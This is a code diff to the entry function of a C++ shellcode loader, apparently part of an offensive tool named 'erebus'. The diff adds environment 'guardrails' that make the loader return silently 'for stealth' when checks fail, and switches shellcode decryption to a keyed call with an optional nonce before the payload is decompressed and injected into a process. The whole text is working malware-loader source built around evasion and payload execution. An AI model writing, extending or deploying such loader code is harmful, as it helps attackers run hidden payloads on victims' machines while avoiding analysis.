@@ -1,8 +1,24 @@
 #include "../include/loader.hpp"
 #include "../include/shellcode.hpp"
+#include "../include/shellcode_optional.hpp"
+#include "../include/config.hpp"
 
 VOID entry(void)
 {
+	// ============================================================
+	// GUARDRAILS CHECK
+	// ============================================================
+	#if CONFIG_GUARDRAILS_ENABLED
+		erebus::guardrails::GuardrailConfig guardrail_config = GetGuardrailConfig();
+		erebus::guardrails::CheckResult guardrail_result = erebus::guardrails::RunGuardrails(guardrail_config);
+		
+		if (!guardrail_result.passed) {
+			// Guardrails failed - exit silently or execute decoy behavior
+			// For stealth, simply return without logging
+			return;
+		}
+	#endif
+
 	erebus::config.injection_method = erebus::GetInjectionMethod();
 
 	HANDLE process_handle = INVALID_HANDLE_VALUE;
@@ -101,7 +117,17 @@ VOID entry(void)
 	}
 	RtlCopyMemory(shellcode_ptr, shellcode, shellcode_size);
 	
-	erebus::DecryptShellcode(&shellcode_ptr, &shellcode_size);
+	BYTE* iv = nullptr;
+	SIZE_T iv_len = 0;
+	#if CONFIG_ENCRYPTION_TYPE == 4
+	if (ShellcodeHasNonce())
+	{
+		iv = nonce;
+		iv_len = 16;
+	}
+	#endif
+
+	erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key, sizeof(key), iv, iv_len);
 	erebus::DecompressShellcode(&shellcode_ptr, &shellcode_size);
 	
 	if (shellcode_ptr == NULL || shellcode_size == 0)
